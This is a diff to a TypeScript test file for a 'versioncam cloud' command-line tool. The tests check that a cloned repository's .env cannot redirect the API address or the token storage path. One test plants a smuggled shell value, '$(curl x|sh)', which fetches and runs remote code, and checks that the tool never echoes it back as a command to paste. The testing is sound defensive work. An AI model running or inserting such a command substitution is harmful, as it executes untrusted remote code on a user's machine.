@@ -1,5 +1,11 @@
 import { execFileSync } from "node:child_process";
-import { existsSync, mkdtempSync, readFileSync, statSync } from "node:fs";
+import {
+  existsSync,
+  mkdtempSync,
+  readFileSync,
+  statSync,
+  writeFileSync,
+} from "node:fs";
 import { createServer, type IncomingMessage, type Server } from "node:http";
 import type { AddressInfo } from "node:net";
 import { tmpdir } from "node:os";
@@ -17,7 +23,13 @@ import type {
   Me,
   ProjectStatus,
 } from "../../cloud/protocol.js";
-import { changeRequest, runCloud } from "./cloud.js";
+import { loadEnvFiles } from "../../env.js";
+import {
+  changeRequest,
+  runCloud,
+  shellEnvironment,
+  type Ignored,
+} from "./cloud.js";
 
 /**
  * `versioncam cloud` against a fake of version.cam's management API: a real
@@ -375,6 +387,18 @@ async function fakeApi(): Promise<Fake> {
   return fake;
 }
 
+/**
+ * A fetch that takes version.cam's own API address to the fake, so the
+ * default API can be exercised with no network.
+ */
+function viaFake(to: Fake): typeof fetch {
+  return ((url: string | URL | Request, init?: RequestInit) =>
+    globalThis.fetch(
+      String(url).replace("https://api.version.cam", to.url),
+      init,
+    )) as typeof fetch;
+}
+
 /** Git with nothing of this machine's configuration, as in repository.test.ts. */
 function gitEnv(home: string): NodeJS.ProcessEnv {
   return { PATH: process.env.PATH, HOME: home, GIT_CONFIG_NOSYSTEM: "1" };
@@ -402,6 +426,7 @@ function machine(fake: Fake) {
     sleeps,
     cwd: mkdtempSync(join(tmpdir(), "versioncam-cloud-cwd-")),
     fetch: globalThis.fetch,
+    ignored: [] as Ignored[],
     /** Make the working directory a clone whose origin is `remote`. */
     clone(remote: string) {
       execFileSync("git", ["init", "-q", self.cwd], { env });
@@ -422,6 +447,7 @@ function machine(fake: Fake) {
       const err: string[] = [];
       const code = await runCloud(argv, {
         env,
+        ignored: self.ignored,
         cwd: self.cwd,
         out: (text) => out.push(text),
         err: (text) => err.push(text),
@@ -512,14 +538,9 @@ describe("versioncam cloud login", () => {
   });
 
   it("says nothing of where it signs in when that is version.cam's own API", async () => {
-    // The default API, reached through the fake: no network in a test.
     const pc = machine(fake);
     delete pc.env.VERSIONCAM_API;
-    pc.fetch = ((url: string | URL | Request, init?: RequestInit) =>
-      globalThis.fetch(
-        String(url).replace("https://api.version.cam", fake.url),
-        init,
-      )) as typeof fetch;
+    pc.fetch = viaFake(fake);
     fake.tokenAnswers = ["token"];
     const { code, out } = await pc.run("login");
     expect(code).toBe(0);
@@ -667,6 +688,105 @@ describe("the token", () => {
     fake.project = { ...project(), manage: `${APP}/acme/app?t=${TOKEN}` };
     const { out } = await pc.run("status", "acme/app", "--json");
     expect(JSON.parse(out).manage).toBe(`${APP}/acme/app?t=[token]`);
+  });
+});
+
+/** What a cloud command says of a VERSIONCAM_API a file set. */
+const IGNORED_API = (file: string, shown: string) =>
+  `${file} sets VERSIONCAM_API${shown}, which versioncam cloud ignores: ` +
+  "it takes the API's address only from the shell, so that no repository can send a sign-in, or a command holding a token, to a server of its choosing. " +
+  "To use another address, set it in the shell: export VERSIONCAM_API=<address>\n";
+
+const IGNORED_CONFIG =
+  ".env sets XDG_CONFIG_HOME, which versioncam cloud ignores: " +
+  "it keeps its sign-in where the shell's environment says, so that no repository can choose where a token is written. " +
+  "To keep it elsewhere, set XDG_CONFIG_HOME in the shell.\n";
+
+describe("a repository's .env", () => {
+  it("chooses neither where cloud login and cloud status go, nor where the token is kept", async () => {
+    // A cloned repository whose file points at a server of its own, and
+    // asks for the sign-in to be written inside it.
+    const elsewhere = await fakeApi();
+    const repo = mkdtempSync(join(tmpdir(), "versioncam-cloud-repo-"));
+    writeFileSync(
+      join(repo, ".env"),
+      `VERSIONCAM_API=${elsewhere.url}\nXDG_CONFIG_HOME=${join(repo, "config")}\n`,
+    );
+    const shell = {
+      VERSIONCAM_API: process.env.VERSIONCAM_API,
+      XDG_CONFIG_HOME: process.env.XDG_CONFIG_HOME,
+    };
+    // A shell that sets neither, whatever the shell running this test does.
+    delete process.env.VERSIONCAM_API;
+    delete process.env.XDG_CONFIG_HOME;
+    try {
+      loadEnvFiles(repo);
+      // The file did set them, for `publish`, which still reads it.
+      expect(process.env.VERSIONCAM_API).toBe(elsewhere.url);
+      const { env, ignored } = shellEnvironment();
+      expect(env.VERSIONCAM_API).toBeUndefined();
+      expect(env.XDG_CONFIG_HOME).toBeUndefined();
+      expect(ignored).toEqual([
+        { name: "VERSIONCAM_API", file: ".env", value: elsewhere.url },
+        { name: "XDG_CONFIG_HOME", file: ".env", value: join(repo, "config") },
+      ]);
+
+      // The commands, in that environment: version.cam's own API (the fake
+      // standing in for it), and the sign-in under the home directory.
+      const pc = machine(fake);
+      delete pc.env.VERSIONCAM_API;
+      delete pc.env.XDG_CONFIG_HOME;
+      pc.ignored = ignored ?? [];
+      pc.cwd = repo;
+      pc.fetch = viaFake(fake);
+      fake.tokenAnswers = ["token"];
+      const login = await pc.run("login");
+      expect(login.code).toBe(0);
+      expect(login.out.split("\n")[0]).toBe(
+        "To sign in this command line to version.cam, open this address on any device:",
+      );
+      const status = await pc.run("status", "acme/app", "--json");
+      expect(status.code).toBe(0);
+      expect(JSON.parse(status.out)).toEqual(fake.project);
+
+      expect(elsewhere.seen).toEqual([]);
+      expect(fake.seen.map((r) => r.path)).toEqual([
+        "/v1/cli/device",
+        "/v1/cli/token",
+        "/v1/projects/acme/app",
+      ]);
+      expect(existsSync(join(repo, "config"))).toBe(false);
+      expect(credentialsPath(pc.env)).toBe(
+        join(pc.home, ".config", "versioncam", "credentials.json"),
+      );
+      expect(readCredential(pc.env, "https://api.version.cam")?.token).toBe(
+        ISSUED,
+      );
+
+      // Said once a run, plainly, and on stderr, out of --json's way.
+      const notice =
+        IGNORED_API(".env", ` to ${elsewhere.url}`) + IGNORED_CONFIG;
+      expect(login.err).toBe(notice);
+      expect(status.err).toBe(notice);
+    } finally {
+      for (const [name, value] of Object.entries(shell)) {
+        if (value === undefined) delete process.env[name];
+        else process.env[name] = value;
+      }
+      await elsewhere.close();
+    }
+  });
+
+  it("never offers a file's value back as a command to paste", async () => {
+    const pc = machine(fake);
+    pc.signIn();
+    pc.ignored = [
+      { name: "VERSIONCAM_API", file: ".env.recording", value: "$(curl x|sh)" },
+    ];
+    const { code, err } = await pc.run("status", "acme/app");
+    expect(code).toBe(0);
+    expect(err).toBe(IGNORED_API(".env.recording", ""));
+    expect(err).not.toContain("curl");
   });
 });
 
